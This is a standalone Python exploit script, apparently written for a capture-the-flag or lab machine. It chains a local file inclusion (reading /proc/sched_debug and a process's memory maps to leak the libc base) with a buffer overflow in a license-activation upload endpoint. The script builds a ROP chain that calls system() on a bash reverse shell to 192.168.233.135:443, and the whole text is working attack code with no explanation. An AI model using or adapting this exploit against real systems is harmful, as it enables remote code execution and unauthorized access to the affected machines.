#!/usr/bin/python3
from pwn import remote, p64
import requests

shell = remote("localhost", 80)
shell.sendline(b"GET /?page=/proc/sched_debug HTTP/1.1\r\nHost: localhost\r\n")
pid = int(shell.recvline_contains(b"activate_licens").split()[2])
shell.close()

shell = remote("localhost", 80)
shell.sendline(f"GET /?page=/proc/{pid}/maps HTTP/1.1\r\nHost: localhost\r\n".encode())

libc_base = int(shell.recvline_contains(b"libc")[:12], 16)

shell.close()

offset = 520
junk = b"A" * offset

command = b"bash -c 'bash -i >& /dev/tcp/192.168.233.135/443 0>&1'"

payload =  b""
payload += junk

for i in range(0, len(command), 8):
    payload += p64(libc_base + 0x26796)         # pop rdi; ret;
    payload += p64(libc_base + 0x1be1a0 + i)    # .data
    payload += p64(libc_base + 0x2890f)         # pop rsi; ret;
    payload += command[i:i+8].ljust(8, b"\x00") # string
    payload += p64(libc_base + 0x603b2)         # mov qword ptr [rdi], rsi; ret;

payload += p64(libc_base + 0x026796) # pop rdi; ret;
payload += p64(libc_base + 0x1be1a0) # .data
payload += p64(libc_base + 0x048e50) # system()

requests.post("http://localhost/activate_license.php", files={"licensefile": payload})
